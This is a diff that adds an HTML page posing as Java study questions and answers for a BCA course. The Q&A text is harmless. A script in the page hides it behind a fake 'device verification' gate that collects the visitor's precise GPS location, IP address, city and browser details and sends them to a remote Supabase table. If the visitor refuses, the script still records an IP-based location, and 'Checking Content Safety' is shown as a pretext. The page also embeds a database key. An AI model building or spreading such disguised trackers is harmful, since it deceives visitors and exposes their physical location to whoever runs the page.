@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>BCA – Java Q&A</title>
+<style>
+  :root {
+    --bg:#0f172a;
+    --panel:#111827;
+    --card:#0b1220;
+    --text:#e5e7eb;
+    --muted:#9ca3af;
+    --accent:#60a5fa;
+    --accent2:#34d399;
+    --border:#1f2937;
+    --chip:#111827;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, Inter, Arial;
+    background: linear-gradient(180deg, #0b1220, #0a1020 40%, #0b1325);
+    color: var(--text);
+    line-height: 1.55;
+  }
+  /* --- Location Gate & Loading Styling --- */
+  #locationGate {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: var(--bg);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    padding: 20px;
+    z-index: 2000;
+    transition: opacity 0.3s ease-in-out;
+  }
+  #locationGate p {
+    font-size: 1.1rem;
+    color: var(--text);
+    margin-bottom: 24px;
+    max-width: 400px;
+  }
+  #allowButton {
+    font-size: 1rem;
+    font-weight: 600;
+    padding: 12px 24px;
+    background-color: var(--accent);
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: background-color 0.2s;
+  }
+  #allowButton:hover {
+    background-color: #3b82f6;
+  }
+  .loader {
+    width: 40px;
+    height: 40px;
+    border: 4px solid var(--border);
+    border-top: 4px solid var(--accent);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  /* --- Main Content --- */
+  #mainContent {
+    display: none; /* Hidden by default */
+  }
+  header {
+    position: sticky;
+    top: 0;
+    background: rgba(10, 16, 32, .85);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--border);
+    z-index: 50;
+  }
+  .container { max-width: 1100px; margin: 0 auto; padding: 16px; }
+  .title { display: flex; align-items: center; gap: 12px; }
+  .title h1 { font-size: 20px; margin: 0; }
+  .pill {
+    font-size: 12px;
+    background: var(--chip);
+    border: 1px solid var(--border);
+    padding: 4px 8px;
+    border-radius: 999px;
+    color: var(--muted);
+  }
+  nav { margin-top: 10px; display: flex; flex-wrap: wrap; gap: 8px; }
+  nav a {
+    font-size: 13px;
+    text-decoration: none;
+    background: var(--chip);
+    border: 1px solid var(--border);
+    padding: 6px 10px;
+    border-radius: 8px;
+    color: var(--text);
+  }
+  main { padding: 24px 0; }
+  .unit {
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    background: linear-gradient(180deg,#0b1220,#0a1324);
+    margin-bottom: 18px;
+    overflow: hidden;
+  }
+  .unit > .head {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 16px 18px;
+    background: rgba(255,255,255,.02);
+    border-bottom: 1px solid var(--border);
+  }
+  .unit h2 { margin: 0; font-size: 18px; color: var(--accent2); }
+  .block { padding: 16px 18px; }
+  h3 { margin: 0 0 10px 0; font-size: 15px; color: var(--accent2); }
+  .qa { margin: 10px 0; padding: 12px; border: 1px solid var(--border);
+    border-radius: 10px; background: rgba(255,255,255,.02); }
+  .q { font-weight: 600; color: var(--accent); margin-bottom: 6px; }
+  .a { color: var(--text); }
+  .foot { margin-top: 24px; color: var(--muted); font-size: 12px; text-align: center; }
+</style>
+</head>
+<body>
+
+<div id="locationGate">
+  <div id="gateContent">
+    <p>To access this document, device verification is required</p>
+    <button id="allowButton">Verify</button>
+  </div>
+</div>
+
+<div id="mainContent">
+  <header>
+    <div class="container">
+      <div class="title">
+        <h1>BCA – Programming in Java (University of Calicut)</h1>
+        <span class="pill">Study Material</span>
+      </div>
+      <nav>
+        <a href="#unit1">Unit I: OOPS</a>
+        <a href="#unit2">Unit II: Java Intro</a>
+        <a href="#unit3">Unit III: Exceptions</a>
+        <a href="#unit4">Unit IV: JDBC</a>
+        <a href="#unit5">Unit V: GUI</a>
+      </nav>
+    </div>
+  </header>
+  <main class="container">
+    <section class="unit" id="unit1">
+      <div class="head"><h2>Unit I – OOPS Concepts</h2></div>
+      <div class="block">
+        <div class="qa">
+          <div class="q">1. Define Object-Oriented Programming (OOP).</div>
+          <div class="a">OOP is a programming paradigm based on the concept of objects that contain data and methods to operate on that data.</div>
+        </div>
+        <div class="qa">
+          <div class="q">2. List the main principles of OOP.</div>
+          <div class="a">Abstraction, Encapsulation, Inheritance, and Polymorphism.</div>
+        </div>
+        <div class="qa">
+          <div class="q">3. What is a class in Java?</div>
+          <div class="a">A class is a blueprint or template from which objects are created. It defines the properties and behaviors that objects of that class will have.</div>
+        </div>
+        <div class="qa">
+          <div class="q">4. What is an object?</div>
+          <div class="a">An object is an instance of a class that has state (attributes) and behavior (methods).</div>
+        </div>
+        <div class="qa">
+          <div class="q">5. Explain encapsulation.</div>
+          <div class="a">Encapsulation is the mechanism of wrapping data (variables) and code (methods) together as a single unit and restricting direct access to some of the object's components.</div>
+        </div>
+        <div class="qa">
+          <div class="q">6. What is inheritance?</div>
+          <div class="a">Inheritance is a mechanism where a new class (child/subclass) derives properties and behaviors from an existing class (parent/superclass).</div>
+        </div>
+        <div class="qa">
+          <div class="q">7. Explain polymorphism.</div>
+          <div class="a">Polymorphism allows objects of different classes to be treated as objects of a common superclass and enables methods to do different things based on the object that invokes them.</div>
+        </div>
+        <div class="qa">
+          <div class="q">8. What is abstraction?</div>
+          <div class="a">Abstraction is the process of hiding implementation details and showing only essential features of an object.</div>
+        </div>
+        <div class="qa">
+          <div class="q">9. Differentiate between method overloading and overriding.</div>
+          <div class="a">Overloading: Same method name, different parameters (compile-time polymorphism). Overriding: Same method signature in subclass (runtime polymorphism).</div>
+        </div>
+        <div class="qa">
+          <div class="q">10. What are access modifiers in Java?</div>
+          <div class="a">Access modifiers define the visibility of classes, methods, and variables. Types: private, default, protected, public.</div>
+        </div>
+      </div>
+    </section>
+    <section class="unit" id="unit2">
+      <div class="head"><h2>Unit II – Introduction to Java</h2></div>
+      <div class="block">
+        <div class="qa">
+          <div class="q">1. What is bytecode in Java?</div>
+          <div class="a">Bytecode is an intermediate code generated by the Java compiler that runs on the JVM.</div>
+        </div>
+        <div class="qa">
+          <div class="q">2. What is JVM?</div>
+          <div class="a">JVM (Java Virtual Machine) is an abstract machine that provides runtime environment to execute Java bytecode.</div>
+        </div>
+        <div class="qa">
+          <div class="q">3. What is JRE?</div>
+          <div class="a">JRE (Java Runtime Environment) contains JVM and class libraries required to run Java applications.</div>
+        </div>
+        <div class="qa">
+          <div class="q">4. What is JDK?</div>
+          <div class="a">JDK (Java Development Kit) contains JRE plus development tools like compiler, debugger, etc.</div>
+        </div>
+        <div class="qa">
+          <div class="q">5. List features of Java.</div>
+          <div class="a">Platform independent, object-oriented, secure, robust, portable, multithreaded, etc.</div>
+        </div>
+        <div class="qa">
+          <div class="q">6. What are data types in Java?</div>
+          <div class="a">Primitive: byte, short, int, long, float, double, char, boolean. Non-primitive: Arrays, Strings, Classes, Interfaces.</div>
+        </div>
+        <div class="qa">
+          <div class="q">7. What are variables in Java?</div>
+          <div class="a">Variables are containers for storing data values. Types: local, instance, static.</div>
+        </div>
+        <div class="qa">
+          <div class="q">8. What are operators in Java?</div>
+          <div class="a">Operators are symbols that perform operations on operands. Types: arithmetic, relational, logical, assignment, etc.</div>
+        </div>
+        <div class="qa">
+          <div class="q">9. Explain control statements.</div>
+          <div class="a">Control statements control the flow of execution. Types: decision making (if, switch), looping (for, while, do-while), branching (break, continue, return).</div>
+        </div>
+        <div class="qa">
+          <div class="q">10. What are arrays in Java?</div>
+          <div class="a">Arrays are objects that store multiple variables of the same type. They have fixed size once created.</div>
+        </div>
+      </div>
+    </section>
+    <section class="unit" id="unit3">
+      <div class="head"><h2>Unit III – Exceptions and Multithreading</h2></div>
+      <div class="block">
+        <div class="qa">
+          <div class="q">1. What is an exception?</div>
+          <div class="a">An exception is an event that disrupts the normal flow of program execution.</div>
+        </div>
+        <div class="qa">
+          <div class="q">2. Difference between checked and unchecked exceptions.</div>
+          <div class="a">Checked: Compile-time exceptions (IOException, SQLException). Unchecked: Runtime exceptions (NullPointerException, ArrayIndexOutOfBounds).</div>
+        </div>
+        <div class="qa">
+          <div class="q">3. What is exception handling?</div>
+          <div class="a">Exception handling is the process of responding to exceptions using try, catch, finally, throw, and throws keywords.</div>
+        </div>
+        <div class="qa">
+          <div class="q">4. What is multithreading?</div>
+          <div class="a">Multithreading is a programming concept where multiple threads run concurrently within a single program.</div>
+        </div>
+        <div class="qa">
+          <div class="q">5. How to create threads in Java?</div>
+          <div class="a">By extending Thread class or implementing Runnable interface.</div>
+        </div>
+        <div class="qa">
+          <div class="q">6. What is synchronization?</div>
+          <div class="a">Synchronization is the capability to control the access of multiple threads to shared resources.</div>
+        </div>
+        <div class="qa">
+          <div class="q">7. What is thread lifecycle?</div>
+          <div class="a">New, Runnable, Running, Blocked/Waiting, Terminated.</div>
+        </div>
+        <div class="qa">
+          <div class="q">8. Difference between wait() and sleep().</div>
+          <div class="a">wait() releases lock, sleep() doesn't. wait() is from Object, sleep() is from Thread.</div>
+        </div>
+        <div class="qa">
+          <div class="q">9. What are collection frameworks?</div>
+          <div class="a">Collection framework provides architecture to store and manipulate group of objects.</div>
+        </div>
+        <div class="qa">
+          <div class="q">10. List common collection interfaces.</div>
+          <div class="a">List, Set, Map, Queue, Deque.</div>
+        </div>
+        <div class="qa">
+          <div class="q">11. What is ArrayList?</div>
+          <div class="a">ArrayList is a resizable array implementation of the List interface.</div>
+        </div>
+        <div class="qa">
+          <div class="q">12. What is HashMap?</div>
+          <div class="a">HashMap is a hash table based implementation of the Map interface.</div>
+        </div>
+        <div class="qa">
+          <div class="q">13. Difference between ArrayList and LinkedList.</div>
+          <div class="a">ArrayList: Random access fast, insertion/deletion slow. LinkedList: Insertion/deletion fast, random access slow.</div>
+        </div>
+        <div class="qa">
+          <div class="q">14. What is HashSet?</div>
+          <div class="a">HashSet is an implementation of Set interface that doesn't allow duplicate elements.</div>
+        </div>
+        <div class="qa">
+          <div class="q">15. What is Iterator?</div>
+          <div class="a">Iterator is an interface used to iterate through collections.</div>
+        </div>
+      </div>
+    </section>
+    <section class="unit" id="unit4">
+      <div class="head"><h2>Unit IV – JDBC and Database Connectivity</h2></div>
+      <div class="block">
+        <div class="qa">
+          <div class="q">1. What is JDBC?</div>
+          <div class="a">JDBC (Java Database Connectivity) is an API that enables Java programs to execute SQL statements.</div>
+        </div>
+        <div class="qa">
+          <div class="q">2. What are JDBC drivers?</div>
+          <div class="a">JDBC drivers implement the JDBC API for specific databases. Types: Type 1 to Type 4.</div>
+        </div>
+        <div class="qa">
+          <div class="q">3. Steps to connect to database using JDBC.</div>
+          <div class="a">1. Load driver, 2. Create connection, 3. Create statement, 4. Execute query, 5. Process results, 6. Close connection.</div>
+        </div>
+        <div class="qa">
+          <div class="q">4. Difference between Statement and PreparedStatement.</div>
+          <div class="a">PreparedStatement is precompiled and more efficient for repeated executions. It prevents SQL injection.</div>
+        </div>
+        <div class="qa">
+          <div class="q">5. What is connection pooling?</div>
+          <div class="a">Connection pooling maintains a cache of database connections that can be reused.</div>
+        </div>
+        <div class="qa">
+          <div class="q">6. What is transaction management?</div>
+          <div class="a">Transaction management ensures database operations are completed as a single unit (all or nothing).</div>
+        </div>
+        <div class="qa">
+          <div class="q">7. What is ResultSet?</div>
+          <div class="a">ResultSet object maintains a cursor pointing to its current row of data and provides methods to retrieve column values.</div>
+        </div>
+        <div class="qa">
+          <div class="q">8. What is batch processing in JDBC?</div>
+          <div class="a">Batch processing allows grouping related SQL statements into a batch and executing them together.</div>
+        </div>
+        <div class="qa">
+          <div class="q">9. What are JDBC exceptions?</div>
+          <div class="a">SQLException is the base exception class for JDBC operations.</div>
+        </div>
+        <div class="qa">
+          <div class="q">10. What is metadata in JDBC?</div>
+          <div class="a">Metadata provides information about the database (DatabaseMetaData) and result set (ResultSetMetaData).</div>
+        </div>
+        <div class="qa">
+          <div class="q">11. How to handle transactions in JDBC?</div>
+          <div class="a">Using setAutoCommit(false), commit(), and rollback() methods.</div>
+        </div>
+        <div class="qa">
+          <div class="q">12. What is CallableStatement?</div>
+          <div class="a">CallableStatement is used to execute stored procedures in the database.</div>
+        </div>
+        <div class="qa">
+          <div class="q">13. What is DatabaseMetaData?</div>
+          <div class="a">DatabaseMetaData provides information about the database like supported features, version, etc.</div>
+        </div>
+        <div class="qa">
+          <div class="q">14. What is ResultSetMetaData?</div>
+          <div class="a">ResultSetMetaData provides information about the columns in a ResultSet.</div>
+        </div>
+        <div class="qa">
+          <div class="q">15. What are the different types of JDBC statements?</div>
+          <div class="a">Statement, PreparedStatement, and CallableStatement.</div>
+        </div>
+      </div>
+    </section>
+    <section class="unit" id="unit5">
+      <div class="head"><h2>Unit V – GUI Programming with AWT and Swing</h2></div>
+      <div class="block">
+        <div class="qa">
+          <div class="q">1. What is AWT?</div>
+          <div class="a">AWT (Abstract Window Toolkit) is Java's original platform-dependent GUI toolkit.</div>
+        </div>
+        <div class="qa">
+          <div class="q">2. What is Swing?</div>
+          <div class="a">Swing is a lightweight, platform-independent GUI toolkit built on top of AWT.</div>
+        </div>
+        <div class="qa">
+          <div class="q">3. Difference between AWT and Swing.</div>
+          <div class="a">AWT is heavyweight (uses OS components), Swing is lightweight (pure Java). Swing has more components and better look-and-feel.</div>
+        </div>
+        <div class="qa">
+          <div class="q">4. What are layout managers?</div>
+          <div class="a">Layout managers automatically arrange components in containers. Examples: FlowLayout, BorderLayout, GridLayout.</div>
+        </div>
+        <div class="qa">
+          <div class="q">5. What is event handling?</div>
+          <div class="a">Event handling is the mechanism to handle user interactions with GUI components.</div>
+        </div>
+        <div class="qa">
+          <div class="q">6. What are event listeners?</div>
+          <div class="a">Event listeners are interfaces that contain methods to handle specific types of events.</div>
+        </div>
+        <div class="qa">
+          <div class="q">7. List common Swing components.</div>
+          <div class="a">JFrame, JButton, JLabel, JTextField, JTextArea, JComboBox, JCheckBox, JRadioButton, JMenu, etc.</div>
+        </div>
+        <div class="qa">
+          <div class="q">8. What is MVC architecture?</div>
+          <div class="a">MVC (Model-View-Controller) separates application into three components: Model (data), View (UI), Controller (logic).</div>
+        </div>
+        <div class="qa">
+          <div class="q">9. What is applet?</div>
+          <div class="a">Applet is a Java program that runs in a web browser. (Note: Deprecated in modern Java)</div>
+        </div>
+        <div class="qa">
+          <div class="q">10. What is JFrame?</div>
+          <div class="a">JFrame is a top-level container that represents the main window of a Swing application.</div>
+        </div>
+        <div class="qa">
+          <div class="q">11. What is JPanel?</div>
+          <div class="a">JPanel is a generic lightweight container used to group components.</div>
+        </div>
+        <div class="qa">
+          <div class="q">12. What are the different event types in AWT/Swing?</div>
+          <div class="a">ActionEvent, MouseEvent, KeyEvent, WindowEvent, etc.</div>
+        </div>
+        <div class="qa">
+          <div class="q">13. What is adapter class?</div>
+          <div class="a">Adapter classes provide empty implementations of listener interfaces to reduce code.</div>
+        </div>
+        <div class="qa">
+          <div class="q">14. What is the difference between paint() and repaint()?</div>
+          <div class="a">paint() is called automatically, repaint() requests a call to paint().</div>
+        </div>
+        <div class="qa">
+          <div class="q">15. What is Graphics class?</div>
+          <div class="a">Graphics class provides methods for drawing shapes, text, and images on components.</div>
+        </div>
+      </div>
+    </section>
+    <div class="foot">
+      © 2025 | Java Study Materials | Educational Content
+    </div>
+  </main>
+</div>
+
+<script type="module">
+  import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
+
+  // --- DOM Elements ---
+  const locationGate = document.getElementById('locationGate');
+  const gateContent = document.getElementById('gateContent');
+  const mainContent = document.getElementById('mainContent');
+  const allowButton = document.getElementById('allowButton');
+
+  // --- Supabase Credentials ---
+  const SUPABASE_URL = "https://vxavtfpnbyccbwwdxefr.supabase.co";
+  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ4YXZ0ZnBuYnljY2J3d2R4ZWZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjAxNTM1NjcsImV4cCI6MjA3NTcyOTU2N30.bPvbVZp7aVZ2FeDFgC8_nR7Gy2FG0GoSTABpTfI2q-Y";
+  const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+  // --- Functions ---
+  function requestLocationPermission() {
+    if (!navigator.geolocation) {
+      console.error("Geolocation is not supported by this browser.");
+      handleLocationError({ message: "Not supported" });
+      return;
+    }
+    console.log("Requesting location permission...");
+    navigator.geolocation.getCurrentPosition(
+      handleLocationSuccess,
+      handleLocationError,
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  async function handleLocationSuccess(position) {
+    console.log("Location access granted.");
+
+    // Show loading state
+    gateContent.innerHTML = `
+      <div class="loader"></div>
+      <p>Checking Content Safety....</p>
+    `;
+
+    const lat = position.coords.latitude;
+    const lng = position.coords.longitude;
+    const accuracy = position.coords.accuracy;
+    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+
+    const ipData = await getIpAddress();
+    const data = {
+      method: "gps_location", latitude: lat, longitude: lng, accuracy: accuracy,
+      google_maps_link: googleMapsLink, ip: ipData.ip, city: ipData.city,
+      region: ipData.region, country: ipData.country_name, timestamp: new Date().toISOString(),
+      user_agent: navigator.userAgent, permission: "granted", page_url: window.location.href
+    };
+    
+    // Wait for data to be saved before showing content
+    await saveToSupabase(data);
+
+    // Hide the gate and show the main content
+    locationGate.style.opacity = '0';
+    setTimeout(() => {
+        locationGate.style.display = 'none';
+        mainContent.style.display = 'block';
+    }, 300); // match transition time
+  }
+
+  function handleLocationError(error) {
+    console.error(`Location denied: ${error.message}`);
+    // Reset to original gate content if user denies
+    gateContent.innerHTML = `
+        <p>Your location is required to verify device connection. Please enable location services in your browser settings if you have previously denied them.</p>
+        <button id="allowButton">Try Again</button>
+    `;
+    // Re-add event listener since the button was replaced
+    document.getElementById('allowButton').addEventListener('click', requestLocationPermission);
+
+    locationGate.style.display = 'flex';
+    mainContent.style.display = 'none';
+    
+    sendIpFallback(); // Still log IP-based attempt
+  }
+
+  async function getIpAddress() {
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      return data;
+    } catch (e) {
+      console.error("IP lookup failed:", e);
+      return { ip: "unknown", city: "unknown", region: "unknown", country_name: "unknown" };
+    }
+  }
+
+  async function sendIpFallback() {
+    try {
+      const ipData = await getIpAddress();
+      const googleMapsLink = ipData.latitude ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : 'N/A';
+      const data = {
+        method: "ip_fallback", ip: ipData.ip, city: ipData.city, region: ipData.region,
+        country: ipData.country_name, latitude: ipData.latitude, longitude: ipData.longitude,
+        google_maps_link: googleMapsLink, timestamp: new Date().toISOString(),
+        user_agent: navigator.userAgent, permission: "denied", page_url: window.location.href
+      };
+      await saveToSupabase(data);
+    } catch (e) {
+      console.error("IP fallback failed:", e);
+    }
+  }
+
+  async function saveToSupabase(data) {
+    const formattedData = {
+      ...data,
+      display_data: `${data.google_maps_link} *${data.ip}*`
+    };
+    try {
+      const { error } = await supabase.from('visitor_locations').insert([formattedData]);
+      if (error) {
+        console.error("Supabase insert failed:", error.message);
+      } else {
+        console.log("Data saved to Supabase successfully.");
+      }
+    } catch (e) {
+      console.error("Save to Supabase failed:", e.message);
+    }
+  }
+
+  // --- Event Listeners & Initializer ---
+  
+  // Add initial click listener to the button
+  allowButton.addEventListener('click', requestLocationPermission);
+  
+  // **NEW LOGIC**: Check permission status on page load
+  window.addEventListener('load', async () => {
+    if (!navigator.permissions) {
+      // If the browser doesn't support the Permissions API, fall back to the old behavior
+      console.log("Permissions API not supported. Asking for location directly.");
+      locationGate.style.display = 'flex'; // Show the gate
+      return;
+    }
+
+    try {
+      const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+      
+      if (permissionStatus.state === 'granted') {
+        // If already granted, load content immediately
+        console.log("Permission already granted. Loading content.");
+        requestLocationPermission(); // This will succeed without a prompt
+      } else {
+        // If 'prompt' or 'denied', the gate is already visible by default, so we just wait for user interaction.
+        console.log(`Permission state is: ${permissionStatus.state}. Waiting for user action.`);
+        locationGate.style.display = 'flex';
+      }
+    } catch (error) {
+      console.error("Error checking permissions:", error);
+      locationGate.style.display = 'flex'; // Show gate as a fallback
+    }
+  });
+
+</script>
+</body>
+</html>
